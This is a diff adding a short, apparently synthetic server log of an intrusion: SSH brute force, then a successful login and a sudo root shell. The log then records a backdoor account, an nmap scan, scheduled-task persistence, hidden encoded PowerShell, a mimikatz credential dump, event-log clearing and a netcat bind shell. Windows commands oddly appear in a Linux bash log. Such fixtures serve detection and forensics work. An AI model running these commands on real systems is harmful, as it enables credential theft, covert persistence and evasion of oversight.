@@ -1,0 +1,18 @@
+Jul  8 02:14:01 web01 sshd[1021]: Failed password for invalid user admin from 203.0.113.45 port 51423 ssh2
+Jul  8 02:14:03 web01 sshd[1021]: Failed password for invalid user admin from 203.0.113.45 port 51424 ssh2
+Jul  8 02:14:05 web01 sshd[1021]: Failed password for invalid user root from 203.0.113.45 port 51425 ssh2
+Jul  8 02:14:08 web01 sshd[1021]: Failed password for invalid user test from 203.0.113.45 port 51426 ssh2
+Jul  8 02:14:12 web01 sshd[1021]: Failed password for jdoe from 203.0.113.45 port 51430 ssh2
+Jul  8 02:14:19 web01 sshd[1021]: Accepted password for jdoe from 203.0.113.45 port 51431 ssh2
+Jul  8 02:14:20 web01 sudo:   jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/bash
+Jul  8 02:15:02 web01 bash[1150]: useradd -m -s /bin/bash svc_backup
+Jul  8 02:15:40 web01 bash[1150]: nmap -sS -p 1-65535 10.0.0.0/24
+Jul  8 02:16:10 web01 bash[1150]: schtasks /create /tn "WinUpdateCheck" /tr C:\Windows\Temp\upd.exe /sc onlogon
+Jul  8 02:16:44 web01 bash[1150]: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+Jul  8 02:17:03 web01 bash[1150]: C:\Tools\mimikatz.exe privilege::debug sekurlsa::logonpasswords
+Jul  8 02:17:22 web01 bash[1150]: wevtutil cl Security
+Jul  8 02:17:55 web01 bash[1150]: nc.exe -lvp 4444 -e cmd.exe
+Jul  8 03:02:11 web01 sshd[1201]: Failed password for invalid user oracle from 198.51.100.9 port 40011 ssh2
+Jul  8 03:02:14 web01 sshd[1201]: Failed password for invalid user oracle from 198.51.100.9 port 40012 ssh2
+Jul  8 03:05:00 web01 cron[900]: (root) CMD (/usr/local/bin/backup.sh)
+Jul  8 03:10:00 web01 sshd[1240]: Accepted publickey for deploy from 10.0.0.5 port 22001 ssh2
